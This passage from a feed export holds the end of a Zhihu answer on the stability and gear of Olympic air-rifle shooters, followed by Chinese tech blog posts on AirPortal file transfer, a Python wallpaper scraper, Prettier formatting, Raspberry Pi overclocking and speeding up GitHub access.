data-private-watermark-src=\"v2-360575c880d0f6d3b0fd6bfd26172d1b\"></p>\n<p><br></p>\n<p>如今奥运会采用的淘汰制（得分最低者陆续被淘汰，最后冠亚军直接PK对决）在比赛观赏性上显然更紧张刺激，对选手的心理考验是极高的。</p>\n<p>因此，射击届也有一个默认的说法，<b>高手之间的竞争往往不是技术的竞争，而是一场无烟的心理战争。</b></p>\n<p><br></p>\n<p>技术动作的稳定性方面，射击选手也会进行大量的体能训练、力量训练。看起来“毫无训练痕迹”的射击运动员，他们在核心肌群的稳定性方面，要远超于普通人。</p>\n<p>关于稳定性有一个非常经典的测试（普通人也可以尝试一下）：</p>\n<p><b>光脚站在平整地面，单脚站立，另一只脚叠放脚背上或悬空，双臂平伸，闭上双眼，然后开始计时——普通人往往在20-60秒间，就无法保持平衡了。</b></p>\n<p>而杜丽之前曾透露过，<b>职业射击运动员能站数分钟甚至十几分钟。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac4c268082a1dbe8930b06391d3d58ba_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"同为十米气步枪选手，2004年拿到雅典奥运会首金的杜丽，如今已是2020年东京奥运会首金杨倩的教练之一\" data-watermark=\"watermark\" data-original-src=\"v2-ac4c268082a1dbe8930b06391d3d58ba\" data-watermark-src=\"v2-9503f92f82b8569d146e9a06b6f395a7\" data-private-watermark-src=\"v2-2f5508e617c5e708dfaf68dd396afc2c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea534331a69079cd508510e5fa4e3bec_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"869\" data-size=\"normal\" data-caption=\"东京夺金后，庞伟的金牌数量也追平妻子杜丽。而庞伟从身型上看，也许也更接近普通人，属于“毫无训练痕迹”的那类。但他们的稳定性及心理素质，则远高于一般人\" data-watermark=\"watermark\" data-original-src=\"v2-ea534331a69079cd508510e5fa4e3bec\" data-watermark-src=\"v2-2676bc9b6a21e63f656e728456f249c1\" data-private-watermark-src=\"v2-4aefb4704a58519f87910e3d46893764\"></p>\n<p><br></p>\n<p>所以心理负荷的控制能力、技术动作和身体的稳定能力，这些都要远远比视力重要。</p>\n<p>和普通人视力水平相似的射击选手之所以做到机器般的精准度，用卖油翁的话来说，</p>\n<p>“无它，唯手熟尔。”</p>\n<hr>\n<p>最后多提一下气步枪射击的装备——</p>\n<p><br></p>\n<p>因为射击器械、射击姿势的不同，气手枪和气步枪的装备差异极大。</p>\n<p>气手枪往往穿着较为舒适、日常运动的服装即可，也不允许借助外界装备来提高射击时的稳定性。而气步枪则全副武装、如同戴了一副盔甲一样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e4ea6eb5560e511a356b3558519b261_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"820\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ea6eb5560e511a356b3558519b261\" data-watermark-src=\"v2-9ccddc00b2cf6ca8783129292865bdce\" data-private-watermark-src=\"v2-0a5285fd59918eefa14727c3b2932cb8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f36277de0652d5801ffa10c472bd20ff_720w.jpg?rss\" data-rawwidth=\"2158\" data-rawheight=\"1216\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f36277de0652d5801ffa10c472bd20ff\" data-watermark-src=\"v2-a86080cb9806ed90c35f56b2e020eba4\" data-private-watermark-src=\"v2-110569dc2dcce28b75abd2149a0a3680\"></p>\n<p><br></p>\n<p>气步枪的射击服，用盔甲形容真不为过。一般用料包括两层厚帆布外加皮革，因此过去的射击服，重量和厚度都相当的惊人，5+公斤是常态。2004年雅典奥运会后，世界射击联合会（issf）对装备有过调整，稍微轻薄了一些。</p>\n<p>专业选手的射击服都是量身定做、专人专制的，<b>整个测量的繁琐程度，远超过很多高级定制西装的规格。</b></p>\n<p>非职业射击训练者，采购专业射击服时如果无法像职业选手那样测量，也需要填写相当繁琐的身体数据，最终的射击服才能勉强一用。</p>\n<p>——就算两个选手身高体重一样，看起来粗粗大大的射击服依然不能换着穿。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9d1ddd68ec017ff6b15eb4df07cf773a_720w.gif?rss\" data-rawwidth=\"555\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9d1ddd68ec017ff6b15eb4df07cf773a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>射击服的所有功能设计，也为达到射击过程中<b>完美的稳定性</b>，以及<b>尽可能杜绝一切外界的、选手自身的干扰</b>，并且<b>对颈椎、腰背等部位起到保护和预防慢性伤病</b>的作用。</p>\n<p>其中选手自身的干扰，就包括因为心脏跳动引起的、和呼吸起伏时身体出现的晃动——结合上面射击成绩和靶纸尺寸，想象一下心跳、呼吸等日常毫无存在感的生理动作，都会极大影响射击的精准度。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8f2115d5f6c2b5aaaa7635cc12dda9bd_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1392\" data-size=\"normal\" data-caption=\"与视觉上的粗矿不同，实际射击服对细节精度、功能要求都极高，是技术含量很高的专业定制化装备\" data-watermark=\"watermark\" data-original-src=\"v2-8f2115d5f6c2b5aaaa7635cc12dda9bd\" data-watermark-src=\"v2-6208fe7e4ff1cf415820fd14efae0c60\" data-private-watermark-src=\"v2-7c64117af74e7817d86c51592dec1192\"></p>\n<p><br></p>\n<p>但本质上，射击又会避免装备带来的稳定性额外加成，所以对装备依然有条条框框的检测标准。</p>\n<p>比如射击鞋。</p>\n<p>在站姿射击中，站立的稳定性、鞋底的防滑性无疑是很重要的。<b>假设选手穿着完全无法曲折、也毫无缓震性的中底，显然稳定性就能达到最大——issf就杜绝了这种情况。</b></p>\n<p>它要求射击鞋“必须是可弯曲的”。专门有个测试射击鞋的器械，要求<b>15牛顿米的力施加到中底时，鞋底必须达到至少22.5°的弯曲。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef6a31cde5087face3793b46a4baba79_720w.jpg?rss\" data-rawwidth=\"2072\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"专业射击用鞋在中底厚度、鞋帮高度等都有严格要求，因为都可能会增加射击时的额外稳定性\" data-watermark=\"watermark\" data-original-src=\"v2-ef6a31cde5087face3793b46a4baba79\" data-watermark-src=\"v2-9915911ea4f747e5296fcd7ca077cc55\" data-private-watermark-src=\"v2-7db8aeafbba433d1c8909a44c8ec50ec\"></p>\n<p><br></p>\n<p>因而，射击服、射击鞋等一方面为了这项运动的单个选手量身定制，尽可能满足稳定性的需要，一方面又不能成为提升精准度、左右成绩的额外加成。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">123 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30252383?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">近视眼对玩射击或者射箭运动的障碍大吗？</a><br><a href=\"http://www.zhihu.com/question/345087864?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高中女生左眼近视625右眼近视675能否参加运动会100米短跑？</a><br>\n","link":"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" 